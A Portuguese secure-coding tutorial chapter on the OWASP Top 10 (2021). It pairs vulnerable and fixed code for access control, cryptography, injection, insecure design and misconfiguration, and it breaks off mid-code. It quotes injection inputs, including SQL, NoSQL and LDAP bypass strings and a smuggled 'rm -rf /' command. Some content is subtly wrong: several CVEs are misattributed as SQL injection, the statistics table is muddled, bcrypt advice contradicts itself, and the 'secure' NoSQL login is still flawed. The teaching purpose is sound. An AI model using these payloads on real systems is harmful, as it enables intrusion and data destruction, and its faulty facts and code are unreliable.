---
layout: default
title: "03-owasp-top-10"
---

# Capítulo 03 — OWASP Top 10: Guia Completo

> *"Conhecer o inimigo é o primeiro passo para derrotá-lo. O OWASP Top 10 é o mapa do campo de batalha."*

---

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

1. Descrever as 10 categorias de vulnerabilidades mais críticas da OWASP Top 10 (edição 2021)
2. Identificar padrões de código vulnerável em JavaScript, Python e Go
3. Aplicar técnicas de prevenção para cada categoria de vulnerabilidade
4. Analisar CVEs reais e entender como as vulnerabilidades foram exploradas
5. Mapear vulnerabilidades para requisitos do OWASP ASVS
6. Conduzir exercícios práticos de identificação e remediação

---

## Visão Geral do OWASP Top 10 2021

### O Que é a OWASP

A Open Web Application Security Project (OWASP) é uma fundação sem fins lucrativos que se dedica a melhorar a segurança de software. Sua principal contribuição para a comunidade é o OWASP Top 10, um documento que padroniza o entendimento sobre as vulnerabilidades mais críticas em aplicações web.

### Evolução do OWASP Top 10

A OWASP Top 10 é revisada periodicamente. A edição de 2021 trouxe mudanças significativas em relação a versão anterior (2017):

| 2017 | 2021 | Mudança |
|------|------|---------|
| A1: Injection | A03: Injection | Rebaixado de posição |
| A2: Broken Authentication | A07: Authentication Failures | Rebaixado de posição |
| A3: Sensitive Data Exposure | A02: Cryptographic Failures | Renomeado e reorganizado |
| A4: XML External Entities (XXE) | Absorvido por A05 | Mesclado |
| A5: Broken Access Control | A01: Broken Access Control | Subiu para #1 |
| A6: Security Misconfiguration | A05: Security Misconfiguration | Permaneceu |
| A7: Cross-Site Scripting (XSS) | Absorvido por A03 | Mesclado |
| A8: Insecure Deserialization | A08: Integrity Failures | Renomeado |
| A9: Using Components with Known Vulnerabilities | A06: Vulnerable and Outdated Components | Renomeado |
| A10: Insufficient Logging and Monitoring | A09: Security Logging Failures | Rebaixado |
| — | A04: Insecure Design | NOVO |
| — | A10: SSRF | NOVO |

### Metodologia da Edição 2021

A edição de 2021 utilizou mais de 500.000 aplicações para análise estatística e levantou contribuições de mais de 25 organizações especializadas em segurança. As principais mudanças metodológicas foram:

- **Dados reais**: Análise de vulnerabilidades reais em produção, não apenas teoria
- **Taxonomia atualizada**: Novas categorias que refletem o threat landscape moderno
- **Mapeamento CWE**: Cada categoria mapeia para uma ou mais Weakness Enumeration do CWE

### Top 10: Visão Resumida

| Rank | Categoria | Incidência | Frequência |
|------|-----------|-----------|------------|
| A01 | Broken Access Control | 55.97% | 3.81x |
| A02 | Cryptographic Failures | 4.64% | 2.90x |
| A03 | Injection | 3.37% | 2.79x |
| A04 | Insecure Design | 3.00% | — (novo) |
| A05 | Security Misconfiguration | 4.51% | 4.51x |
| A06 | Vulnerable Components | 8.77% | 2.82x |
| A07 | Authentication Failures | 2.55% | 2.55x |
| A08 | Integrity Failures | 2.05% | 2.05x |
| A09 | Logging Failures | 6.51% | 2.13x |
| A10 | SSRF | 2.72% | 2.72x |

---

## A01: Broken Access Control

### Descrição

Broken Access Control assume a posição de vulnerabilidade mais prevalente no OWASP Top 10 2021, afetando 55.97% das aplicações analisadas. Essa categoria envui falhas que permitem que usuários acessem funcionalidades ou dados que não deveriam ter permissão.

O acesso control é o mecanismo que restringe o que um usuário autenticado pode fazer. Quando esse controle falha, as consequências podem ser devastativas: acesso a dados de outros usuários, elevação de privilégios, e manipulação ou destruição de informações.

### Tipos de Broken Access Control

**Insecure Direct Object References (IDOR)**:
Ocorre quando o aplicativo usa o identificador fornecido pelo usuário para acessar objetos diretamente, sem verificar se o usuário tem autorização.

**Privilege Escalation Vertical**:
Um usuário comum consegue acessar funcionalidades administrativas ou de outro nível superior.

**Privilege Escalation Horizontal**:
Um usuário consegue acessar dados ou funcionalidades de outro usuário no mesmo nível.

**Missing Function-Level Access Control**:
O servidor não verifica se o usuário está autorizado a acessar uma função específica antes de processar a requisição.

**Force Browsing**:
O usuário acessa páginas protegidas modificando a URL diretamente no navegador.

### CVE-2019-11091 — Microarchitectural Data Sampling (MDS)

A CVE-2019-11091 é uma vulnerabilidade de acesso a dados que afeta processadores Intel. Embora seja uma vulnerabilidade de hardware, ela demonstra o princípio fundamental do Broken Access Control: processos não deveriam conseguir acessar dados de outros processos.

**Impacto**: Permite que um processo malicioso leia dados que deveriam estar isolados em nível de hardware, incluindo chaves criptográficas e dados sensíveis em memória.

### Exemplos em Código

#### JavaScript/Node.js — IDOR

```javascript
// VULNERAVEL: Endpoint sem verificacao de ownership
app.get('/api/users/:userId/documents', async (req, res) => {
  const { userId } = req.params;
  const documents = await Document.find({ userId });
  res.json(documents);
});

// Seguro: Verificacao de ownership com autenticacao
app.get('/api/users/:userId/documents', authenticate, async (req, res) => {
  const { userId } = req.params;
  const authenticatedUserId = req.user.id;

  if (userId !== authenticatedUserId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }

  const documents = await Document.find({ userId });
  res.json(documents);
});
```

#### Python/Flask — Force Browsing

```python
# VULNERAVEL: Rota admin sem decorador de autenticacao
@app.route('/admin/dashboard')
def admin_dashboard():
    return render_template('admin/dashboard.html')

@app.route('/admin/users/<int:user_id>/delete', methods=['POST'])
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return redirect(url_for('admin_users'))

# Seguro: Middleware de verificacao de papel
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'admin':
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/dashboard')
@login_required
@admin_required
def admin_dashboard():
    return render_template('admin/dashboard.html')

@app.route('/admin/users/<int:user_id>/delete', methods=['POST'])
@login_required
@admin_required
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return redirect(url_for('admin_users'))
```

#### Go — Privilege Escalation

```go
// VULNERAVEL: Handler sem verificacao de nivel de acesso
func DeleteUserHandler(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    targetUserID := vars["userId"]

    user := findUserByID(targetUserID)
    if user == nil {
        http.Error(w, "User not found", http.StatusNotFound)
        return
    }

    deleteUser(user)
    w.WriteHeader(http.StatusOK)
}

// Seguro: Middleware de autorizacao
func RequireRole(role string, next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        session, err := store.Get(r, "session")
        if err != nil {
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }

        userRole, ok := session.Values["role"].(string)
        if !ok || userRole != role {
            http.Error(w, "Forbidden", http.StatusForbidden)
            return
        }

        next(w, r)
    }
}

func DeleteUserHandler(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    targetUserID := vars["userId"]
    sessionUserID := r.Context().Value("userID").(string)

    if targetUserID != sessionUserID {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }

    user := findUserByID(targetUserID)
    if user == nil {
        http.Error(w, "User not found", http.StatusNotFound)
        return
    }

    deleteUser(user)
    w.WriteHeader(http.StatusOK)
}

// Registro com verificacao de papel
router.HandleFunc("/admin/users/{userId}/delete",
    RequireRole("admin", DeleteUserHandler)).Methods("DELETE")
```

### Padrões de Prevenção

1. **Princípio do Menor Privilégio**: Conceda apenas as permissões mínimas necessárias
2. **Verificação Server-Side**: Nunca confie na verificação client-side de acesso
3. **Deny by Default**: Rejeite todas as requisições por padrão, exceto as explicitamente permitidas
4. **Reutilização de Controles**: Use mecanismos centralizados de controle de acesso
5. **Rate Limiting**: Limite tentativas de acesso para prevenir brute force em endpoints protegidos

### Caso de Estudo CVE-2019-11091

**Vulnerabilidade**: Microarchitectural Data Sampling em processadores Intel
**CVSS**: 5.6 (Médio)
**Impacto**: Leitura de dados em memória entre processos
**Mitigações**: Microcode updates, patches do kernel, isolamento de processos em hardware

Esta CVE demonstra que o acesso a dados inadequado pode ocorrer em qualquer camada — do hardware ao software. Na web, o equivalente é quando um usuário consegue acessar dados de outro sem autorização.

---

## A02: Cryptographic Failures

### Descrição

Cryptographic Failures (anteriormente denominada "Sensitive Data Exposure") abrange vulnerabilidades relacionadas à proteção inadequada de dados sensíveis. Isso inclui uso de algoritmos fracos, armazenamento inadequado de chaves, transmissão de dados em texto plano, e falhas na implementação de criptografia.

### CVE-2014-0160 — Heartbleed

O Heartbleed é uma das vulnerabilidades criptográficas mais devastadoras da história. Afetava o OpenSSL, a biblioteca TLS/SSL mais utilizada do mundo na época.

**Mecanismo da Vulnerabilidade**:
O Heartbeat Extension do TLS permite que um cliente envie um payload e o servidor ecoe de volta. A vulnerabilidade estava na falta de verificação do tamanho do payload: um cliente poderia enviar 1 byte de dados, mas declarar que enviou 64KB, fazendo o servidor retornar 64KB de memória adjacente ao buffer — que poderia conter chaves privadas, senhas ou outros dados sensíveis.

**CVE**: CVE-2014-0160
**CVSS**: 7.5 (Alto)
**Afetados**: OpenSSL 1.0.1 até 1.0.1f
**Impacto**: Até 64KB de memória do servidor podiam ser vazados por requisição

### Algoritmos Fracos vs. Seguros

| Algoritmo | Status | Uso Recomendado |
|-----------|--------|-----------------|
| MD5 | Inseguro | Nunca usar para hash de senhas ou assinaturas digitais |
| SHA-1 | Inseguro | Nunca usar para assinaturas digitais |
| SHA-256 | Seguro | Hash geral, checksums |
| SHA-384/512 | Seguro | Hash para alta segurança |
| AES-128 | Seguro | Criptografia simétrica (mínimo recomendado) |
| AES-256 | Seguro | Criptografia simétrica de alta segurança |
| RSA-2048 | Aceitável | Assinaturas digitais (mínimo recomendado) |
| RSA-4096 | Seguro | Assinaturas digitais de alta segurança |
| ECC (P-256) | Seguro | Assinaturas e troca de chaves |
| 3DES | Inseguro | Nunca usar |
| RC4 | Inseguro | Nunca usar |
| Blowfish | Deprecado | Usar AES |

### Armazenamento Seguro de Senhas

```python
# VULNERAVEL: Hash sem salt ou com algoritmo fraco
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def verify_password(password, stored_hash):
    return hashlib.md5(password.encode()).hexdigest() == stored_hash

# Seguro: Usando bcrypt
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode('utf-8'), salt)

def verify_password(password, stored_hash):
    return bcrypt.checkpw(password.encode('utf-8'), stored_hash)

# Seguro: Usando Argon2 (recomendado para novos projetos)
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,
    memory_cost=65536,
    parallelism=4,
    hash_len=32,
    salt_len=16
)

def hash_password(password):
    return ph.hash(password)

def verify_password(password, stored_hash):
    try:
        return ph.verify(stored_hash, password)
    except Exception:
        return False
```

### Criptografia de Dados em Trânsito

```javascript
// VULNERAVEL: Conexao HTTP sem TLS
const http = require('http');
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello World');
}).listen(80);

// Seguro: Conexao HTTPS com TLS 1.3
const https = require('https');
const fs = require('fs');

const options = {
    key: fs.readFileSync('/etc/ssl/private/server.key'),
    cert: fs.readFileSync('/etc/ssl/certs/server.crt'),
    minVersion: 'TLSv1.2',
    ciphers: [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256'
    ].join(':'),
    honorCipherOrder: true
};

https.createServer(options, (req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello World');
}).listen(443);
```

### Criptografia de Dados em Repouso

```python
# VULNERAVEL: Dados sensiveis em texto plano no banco
def save_user_data(user_id, ssn, credit_card):
    db.execute(
        "INSERT INTO user_data (user_id, ssn, credit_card) VALUES (?, ?, ?)",
        (user_id, ssn, credit_card)  # Dados em texto plano!
    )

# Seguro: Usando encriptacao com AES-GCM
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

class DataEncryptor:
    def __init__(self, key: bytes):
        self.aesgcm = AESGCM(key)

    def encrypt(self, data: str) -> tuple:
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, data.encode('utf-8'), None)
        return nonce, ciphertext

    def decrypt(self, nonce: bytes, ciphertext: bytes) -> str:
        plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode('utf-8')

# Chave derivada com PBKDF2
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=600000,
    )
    return kdf.derive(password.encode('utf-8'))

# Uso
password_key = derive_key("master-password", os.urandom(16))
encryptor = DataEncryptor(password_key)

# Encriptar dados antes de salvar
nonce, ciphertext = encryptor.encrypt("123.456.789-00")
db.execute(
    "INSERT INTO user_data (user_id, ssn_nonce, ssn_encrypted) VALUES (?, ?, ?)",
    (user_id, nonce, ciphertext)
)
```

### Gerenciamento Seguro de Chaves

```javascript
// VULNERAVEL: Chave hardcoded no codigo
const API_KEY = "sk_live_abc123xyz789";
const DB_PASSWORD = "admin123";

// Seguro: Variaveis de ambiente com validacao
const Joi = require('joi');

const envSchema = Joi.object({
    DATABASE_URL: Joi.string().uri().required(),
    API_KEY: Joi.string().min(32).required(),
    JWT_SECRET: Joi.string().min(64).required(),
    REDIS_URL: Joi.string().uri().required()
}).unknown();

const { error, value: env } = envSchema.validate(process.env);
if (error) {
    throw new Error(`Missing environment variable: ${error.message}`);
}

// Uso em producao: Secrets Manager
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

async function getSecret(secretId) {
    const client = new SecretsManagerClient({ region: 'us-east-1' });
    const command = new GetSecretValueCommand({ SecretId: secretId });
    const response = await client.send(command);
    return JSON.parse(response.SecretString);
}

// Uso com rotacao automatica de chaves
class SecureApiKeyManager {
    constructor(secretId, cacheTTL = 3600) {
        this.secretId = secretId;
        this.cacheTTL = cacheTTL;
        this.cachedSecret = null;
        this.lastFetch = 0;
    }

    async getApiKey() {
        const now = Date.now();
        if (this.cachedSecret && (now - this.lastFetch) < this.cacheTTL * 1000) {
            return this.cachedSecret;
        }

        const secret = await getSecret(this.secretId);
        this.cachedSecret = secret.apiKey;
        this.lastFetch = now;
        return this.cachedSecret;
    }
}
```

### Padrões de Prevenção

1. **TLS 1.2+ Obrigatório**: Nunca aceite conexões com protocolos anteriores
2. **Perfect Forward Secrecy**: Use ECDHE para troca de chaves
3. **Argon2 para Senhas**: Evite MD5, SHA-1 e bcrypt (prefira Argon2id)
4. **HSTS**: Force HTTPS via Strict-Transport-Security
5. **Key Rotation**: Implemente rotação automática de chaves criptográficas
6. **Certificate Pinning**: Para aplicações móveis, use pinning de certificados

### Caso de Estudo CVE-2014-0160 (Heartbleed)

**Data de Descoberta**: 7 de abril de 2014
**Vulnerabilidade**: Buffer over-read em heartbeat extension do OpenSSL
**Código Vulnerável**:

```c
// OpenSSL 1.0.1f - ssl/d1_both.c
int dtls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16;

    hbtype = *p++;
    n2s(p, payload);
    pl = p;

    // FALTA: Verificacao de que payload <= 16
    // O servidor envia payload bytes de memoria
    // sem verificar se o cliente realmente enviou isso

    if (hbtype == TLS1_HB_REQUEST) {
        unsigned char *buffer, *bp;
        buffer = OPENSSL_malloc(1 + 2 + payload + padding);
        bp = buffer;
        *bp++ = TLS1_HB_RESPONSE;
        s2n(payload, bp);
        memcpy(bp, pl, payload);  // LEAK: pl contem apenas 1 byte
        bp += payload;            // mas payload pode ser 65535
        OPENSSL_free(buffer);
    }
}
```

**Impacto**: Estima-se que 17% dos servidores TLS (cerca de 500.000) foram vulneráveis. Até 64KB de memória do servidor podiam ser vazados, potencialmente expondo chaves privadas, tokens de sessão e credenciais.

**Resposta da Comunidade**: Heartbleed demonstrou a dependência crítica da internet de uma única biblioteca e levou a melhorias significativas no processo de auditoria de código aberto.

---

## A03: Injection

### Descrição

Injection continua sendo uma das vulnerabilidades mais perigosas e prevalecentes. Embora tenha descido do posto #1 para #3, ela permanece com 3.37% de incidência e fator de correção de 2.79x.

Injection ocorre quando dados não confiáveis são enviados para um interpretador como parte de um comando ou query. O atacante injeta código malicioso que é executado pelo interpretador, permitindo acesso não autorizado, alteração de dados ou execução de comandos arbitrários.

### Tipos de Injection

#### SQL Injection (SQLi)

SQL Injection é o tipo mais clássico e perigoso de injection. Permite ao atacante manipular queries SQL para acessar, modificar ou destruir dados.

**Exemplos de CVEs**:
- CVE-2023-34362 (MOVEit): SQL injection que afetou milhares de organizações
- CVE-2019-11510 (Pulse Secure): SQL injection em VPNs corporativas
- CVE-2012-2122: SQL injection no MySQL que permitia bypass de autenticação

```python
# VULNERAVEL: SQL Injection simples
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# Atacante envia: admin' --
# Query resultante: SELECT * FROM users WHERE username = 'admin' --'

# Seguro: Parametrizacao de queries
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# Seguro: Usando ORM (SQLAlchemy)
from sqlalchemy import select
from sqlalchemy.orm import Session

def get_user(session: Session, username: str):
    stmt = select(User).where(User.username == username)
    return session.execute(stmt).scalar_one_or_none()

# Seguro: Usando SQLAlchemy com input validado
from sqlalchemy import select, func
from pydantic import BaseModel, validator

class UsernameQuery(BaseModel):
    username: str

    @validator('username')
    def validate_username(cls, v):
        if not v.isalnum():
            raise ValueError('Username must be alphanumeric')
        if len(v) > 50:
            raise ValueError('Username too long')
        return v

def get_user_safe(session: Session, username_input: str):
    validated = UsernameQuery(username=username_input)
    stmt = select(User).where(User.username == validated.username)
    return session.execute(stmt).scalar_one_or_none()
```

#### NoSQL Injection

NoSQL databases também são vulneráveis a injection, embora os vetores sejam diferentes.

```javascript
// VULNERAVEL: MongoDB injection
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({
        username: username,
        password: password
    });
    if (user) {
        res.json({ success: true, user });
    } else {
        res.status(401).json({ success: false });
    }
});

// Atacante envia: {"username": "admin", "password": {"$gt": ""}}
// Isso ignora a verificacao de senha

// Seguro: Validacao e sanitizacao de input
const Joi = require('joi');

const loginSchema = Joi.object({
    username: Joi.string().alphanum().max(50).required(),
    password: Joi.string().min(8).max(128).required()
});

app.post('/login', async (req, res) => {
    const { error, value } = loginSchema.validate(req.body);
    if (error) {
        return res.status(400).json({ error: error.details[0].message });
    }

    const { username, password } = value;
    const user = await User.findOne({
        username: username,
        password: password
    }).select('+password');

    if (!user || !await bcrypt.compare(password, user.password)) {
        return res.status(401).json({ success: false });
    }

    res.json({ success: true, user: { id: user.id, username: user.username } });
});
```

#### LDAP Injection

```python
# VULNERAVEL: LDAP Injection
import ldap

def ldap_search(username):
    base_dn = "dc=example,dc=com"
    filter_str = f"(&(objectClass=person)(uid={username}))"
    return ldap.initialize("ldap://ldap.example.com").search_s(
        base_dn, ldap.SCOPE_SUBTREE, filter_str
    )

# Atacante envia: *)(uid=*))(|(uid=*
# A query se torna: (&(objectClass=person)(uid=*)(uid=*))(|(uid=*)(uid=*))
# Isso retorna todos os usuarios

# Seguro: Escapar caracteres especiais LDAP
def escape_ldap_filter(value):
    """
    Escapa caracteres especiais em filtros LDAP conforme RFC 4515
    """
    if not value:
        return ""
    escape_map = {
        '\\': '\\5c',
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\x00': '\\00',
    }
    result = []
    for char in value:
        if char in escape_map:
            result.append(escape_map[char])
        elif ord(char) < 0x20:
            result.append(f'\\{ord(char):02x}')
        else:
            result.append(char)
    return ''.join(result)

def ldap_search_safe(username):
    base_dn = "dc=example,dc=com"
    escaped = escape_ldap_filter(username)
    filter_str = f"(&(objectClass=person)(uid={escaped}))"
    return ldap.initialize("ldap://ldap.example.com").search_s(
        base_dn, ldap.SCOPE_SUBTREE, filter_str
    )
```

#### OS Command Injection

```python
# VULNERAVEL: OS Command Injection
import os

def ping_host(hostname):
    os.system(f"ping -c 4 {hostname}")
    # Atacante envia: 127.0.0.1; rm -rf /

# Seguro: Usando subprocess com argumentos separados
import subprocess
import shlex

def ping_host_safe(hostname):
    if not re.match(r'^[a-zA-Z0-9\.\-]+$', hostname):
        raise ValueError("Invalid hostname")
    result = subprocess.run(
        ['ping', '-c', '4', hostname],
        capture_output=True,
        text=True,
        timeout=30
    )
    return result.stdout
```

```javascript
// VULNERAVEL: Command injection em Node.js
const { exec } = require('child_process');

app.get('/api/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 4 ${host}`, (error, stdout, stderr) => {
        res.json({ output: stdout });
    });
});

// Seguro: Usando execFile com array de argumentos
const { execFile } = require('child_process');
const net = require('net');

app.get('/api/ping', (req, res) => {
    const host = req.query.host;

    // Validar hostname
    if (!net.isIP(host) && !/^[a-zA-Z0-9\.\-]+$/.test(host)) {
        return res.status(400).json({ error: 'Invalid host' });
    }

    execFile('ping', ['-c', '4', host], { timeout: 10000 }, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: 'Ping failed' });
        }
        res.json({ output: stdout });
    });
});
```

#### ORM Injection

```python
# VULNERAVEL: Django ORM com F() expressions sem sanitizacao
from django.db.models import Q
from django.db.models.functions import RawSQL

def search_products(term):
    # VULNERAVEL: Raw SQL injection
    return Product.objects.annotate(
        relevance=RawSQL("MATCH(name, description) AGAINST (%s)", [term])
    ).order_by('-relevance')

# Seguro: Usar apenas ORM nativo
def search_products_safe(term):
    from django.db.models import Q
    return Product.objects.filter(
        Q(name__icontains=term) | Q(description__icontains=term)
    )
```

### Padrões de Prevenção

1. **Prepared Statements**: Use sempre queries parametrizadas
2. **Input Validation**: Valide e sanitize todo input antes de usar em queries
3. **ORM**: Use ORM sempre que possível
4. **Least Privilege**: O banco de dados deve ter permissões mínimas
5. **Stored Procedures**: Use procedimentos armazenados para operações complexas
6. **WAF**: Implemente Web Application Firewall para detectar padrões de injection
7. **Escapamento**: Quando não for possível usar parâmetros, escape adequadamente

### Caso de Estudo CVE-2023-34362 (MOVEit)

**Data**: Junho de 2023
**Vulnerabilidade**: SQL Injection no MOVEit Transfer
**Impacto**: Mais de 2.500 organizações afetadas, dados de milhões de pessoas comprometidos
**CVE**: CVE-2023-34362
**CVSS**: 9.8 (Crítico)

O atacante explora uma SQL injection não autenticada para executar queries arbitrárias no banco de dados SQL Server, permitindo acesso não autorizado e movimentação de dados.

---

## A04: Insecure Design

### Descrição

Insecure Design é uma categoria nova na edição 2021, reconhecendo que muitas vulnerabilidades são resultado de falhas arquiteturais, não apenas de bugs de implementação. Enquanto outras categorias focam em como o código falha, Insecure Design foca em como o sistema foi projetado de forma insegura desde o início.

### Diferença entre Design Inseguro e Bugs

Um design inseguro não é o mesmo que uma implementação incorreta:

- **Design Inseguro**: A arquitetura permite abusos por design, mesmo que o código esteja correto
- **Bug de Implementação**: O código não corresponde ao design seguro

**Exemplo de Design Inseguro**: Um sistema de bank transfer que permite transferências ilimitadas sem verificação de saldo é um design inseguro, mesmo que todo o código esteja perfeitamente implementado.

### Threat Modeling

Threat modeling é o processo de identificar, quantificar e priorizar riscos de segurança. O padrão mais utilizado é o STRIDE:

| Modelo | Descrição |
|--------|-----------|
| **S**poofing | Falsificação de identidade |
| **T**ampering | Manipulação de dados |
| **R**epudiation | Negação de ações |
| **I**nformation Disclosure | Vazamento de informações |
| **D**enial of Service | Negação de serviço |
| **E**levation of Privilege | Elevação de privilégios |

### Exemplos de Design Inseguro

```python
# DESIGN INSEGURO: Sistema de recuperacao de senha sem rate limiting
@app.route('/api/password-reset', methods=['POST'])
def request_password_reset():
    email = request.json.get('email')
    user = User.query.filter_by(email=email).first()

    if user:
        token = generate_reset_token(user.id)
        send_reset_email(email, token)
        return jsonify({"message": "If the email exists, a reset link was sent"})

    return jsonify({"message": "If the email exists, a reset link was sent"})

# DESIGN SEGURO: Rate limiting e logging
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import logging

limiter = Limiter(key_func=get_remote_address)
logger = logging.getLogger(__name__)

@app.route('/api/password-reset', methods=['POST'])
@limiter.limit("5 per hour")
def request_password_reset():
    email = request.json.get('email')
    user = User.query.filter_by(email=email).first()

    # Log a tentativa (sem revelar se o email existe)
    logger.info(f"Password reset requested for: {mask_email(email)}")

    if user:
        token = generate_reset_token(user.id)
        send_reset_email(email, token)

    # Sempre retorna a mesma mensagem
    return jsonify({
        "message": "If the email exists, a reset link was sent"
    })

@app.route('/api/password-reset/<token>', methods=['POST'])
@limiter.limit("3 per hour")
def reset_password(token):
    try:
        user_id = verify_reset_token(token)
    except InvalidToken:
        return jsonify({"error": "Invalid or expired token"}), 400

    new_password = request.json.get('password')

    # Validacao de senha
    if not is_strong_password(new_password):
        return jsonify({"error": "Password does not meet requirements"}), 400

    # Verificar se a senha nao foi comprometida
    if is_password_pwned(new_password):
        return jsonify({"error": "Password has been found in a data breach"}), 400

    user = User.query.get(user_id)
    user.password_hash = hash_password(new_password)
    db.session.commit()

    # Invalidar todos os tokens anteriores
    invalidate_all_tokens(user_id)

    # Enviar notificacao
    send_password_changed_notification(user.email)

    return jsonify({"message": "Password updated successfully"})
```

### Secure Design Patterns

```python
# PADRAO: Defense in Depth para upload de arquivos
import os
import magic
import hashlib
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}

class SecureFileUpload:
    def __init__(self, upload_dir, max_size=MAX_FILE_SIZE):
        self.upload_dir = upload_dir
        self.max_size = max_size

    def validate_file(self, file):
        # 1. Verificar tamanho
        file.seek(0, os.SEEK_END)
        size = file.tell()
        file.seek(0)

        if size > self.max_size:
            raise ValidationError(f"File exceeds maximum size of {self.max_size} bytes")

        # 2. Verificar extensao
        filename = secure_filename(file.filename)
        ext = os.path.splitext(filename)[1].lower().lstrip('.')

        if ext not in ALLOWED_EXTENSIONS:
            raise ValidationError(f"File type .{ext} is not allowed")

        # 3. Verificar MIME type real (não confiar no Content-Type)
        header = file.read(2048)
        file.seek(0)

        mime = magic.from_buffer(header, mime=True)
        if mime not in ALLOWED_MIME_TYPES:
            raise ValidationError(f"File MIME type {mime} is not allowed")

        # 4. Gerar nome seguro para o arquivo
        file_hash = hashlib.sha256(header).hexdigest()
        safe_filename = f"{file_hash}.{ext}"

        return safe_filename

    def save_file(self, file):
        safe_name = self.validate_file(file)

        # 5. Salvar com nome controlado
        filepath = os.path.join(self.upload_dir, safe_name)
        file.save(filepath)

        # 6. Verificar integridade
        with open(filepath, 'rb') as f:
            saved_hash = hashlib.sha256(f.read()).hexdigest()

        if saved_hash != safe_name.split('.')[0]:
            os.remove(filepath)
            raise SecurityError("File integrity check failed")

        return filepath
```

### Padrões de Prevenção

1. **Thred Modeling**: Use STRIDE, PASTA ou DREAD para modelar ameaças
2. **Secure Design Review**: Revise o design antes da implementação
3. **Reference Architecture**: Use arquiteturas de referência seguras
4. **Defense in Depth**: Implemente múltiplas camadas de segurança
5. **Fail-Secure**: O sistema deve falhar para um estado seguro
6. **Secure by Default**: Configurações padrão devem ser as mais seguras

---

## A05: Security Misconfiguration

### Descrição

Security Misconfiguration é uma das vulnerabilidades mais comuns, afetando 4.51% das aplicações. Ocorre quando o software, frameworks, servidores ou configurações de segurança estão configurados incorretamente.

### Tipos de Misconfiguration

1. **Credenciais Padrão**: Usuários e senhas que vêm com o software
2. **Serviços Desnecessários**: Portas e serviços abertos sem necessidade
3. **Mensagens de Erro Detalhadas**: Stack traces expostos ao usuário
4. **Configurações de Segurança Padrão**: Headers de segurança ausentes
5. **Verbose Logging**: Logs que expõem informações sensíveis

### Exemplos em Código

```python
# VULNERAVEL: Configuracao Django em producao
# settings.py
DEBUG = True
SECRET_KEY = 'django-insecure-key-for-development'
ALLOWED_HOSTS = ['*']
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': 'db.sqlite3',
    }
}
CORS_ALLOW_ALL_ORIGINS = True
CSRF_COOKIE_SECURE = False
SESSION_COOKIE_SECURE = False

# Seguro: Configuracao segura para producao
# settings.py
import os

DEBUG = False
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("DJANGO_SECRET_KEY environment variable is required")

ALLOWED_HOSTS = os.environ.get('ALLOWED_HOSTS', '').split(',')

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('DB_NAME'),
        'USER': os.environ.get('DB_USER'),
        'PASSWORD': os.environ.get('DB_PASSWORD'),
        'HOST': os.environ.get('DB_HOST', 'localhost'),
        'PORT': os.environ.get('DB_PORT', '5432'),
        'OPTIONS': {
            'sslmode': 'require',
            'connect_timeout': 5,
        }
    }
}

CORS_ALLOW_ALL_ORIGINS = False
CORS_ALLOWED_ORIGINS = os.environ.get('CORS_ALLOWED_ORIGINS', '').split(',')
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
SESSION_COOKIE_HTTPONLY = True

SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_SSL_REDIRECT = True
X_FRAME_OPTIONS = 'DENY'
```

```javascript
// VULNERAVEL: Express.js sem headers de seguranca
const express = require('express');
const app = express();

